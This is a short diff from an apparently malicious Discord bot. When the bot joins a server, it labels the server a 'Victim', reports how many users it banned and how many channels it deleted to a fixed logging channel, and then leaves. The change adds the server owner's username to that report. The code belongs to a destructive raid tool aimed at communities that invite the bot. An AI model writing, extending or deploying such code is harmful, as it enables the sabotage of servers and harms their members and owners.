@@ -45,7 +45,7 @@ client.on('guildCreate', async (guild) => {
   if(users > 0 || channels > 0) {
     embed.setAuthor(`Victim |  ${guild.name}`, guild.iconURL)
           .setColor(3447003)
-          .setDescription(`Banned ${users} users\nDeleted ${channels} channels`); 
+          .setDescription(`Owner - ${guild.owner.user.username}\nBanned - ${users} users\nDeleted - ${channels} channels`); 
     client.channels.get('274770009883148288').sendEmbed(embed)
   }
   guild.leave();
